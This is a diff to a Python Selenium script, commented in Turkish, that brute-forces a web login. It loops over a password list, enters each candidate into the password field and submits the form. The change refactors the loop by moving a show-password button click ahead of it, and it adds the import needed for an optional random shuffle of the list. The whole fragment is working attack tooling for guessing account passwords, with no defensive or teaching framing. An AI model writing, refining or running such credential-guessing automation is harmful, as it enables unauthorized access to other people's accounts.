@@ -1,3 +1,4 @@
+import random
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.by import By
@@ -26,16 +27,13 @@ sifreText = driver.find_element(By.NAME, 'password')
 
 # Şifreleri karışık denemesi için aşağıdaki # işaretini siliniz.
 # random.shuffle(bruteforce)
-for password in bruteforce:
 
+hide = (By.CSS_SELECTOR, '#loginForm > div > div:nth-child(2) > div > div > div > button')
+element = wait.until(EC.element_to_be_clickable(hide))
+element.click()
+for password in bruteforce:
     password_field.send_keys(password)
     wait.until(EC.element_to_be_clickable((By.XPATH, '//button[@type="submit"]')))
-    a = 1
-    if a == 1:
-        xpat = (By.CSS_SELECTOR, '#loginForm > div > div:nth-child(2) > div > div > div > button')
-        element = wait.until(EC.element_to_be_clickable(xpat))
-        element.click()
-        a += 1
     login_button = driver.find_element(By.XPATH, '//button[@type="submit"]')
     login_button.click()
     time.sleep(0.1)
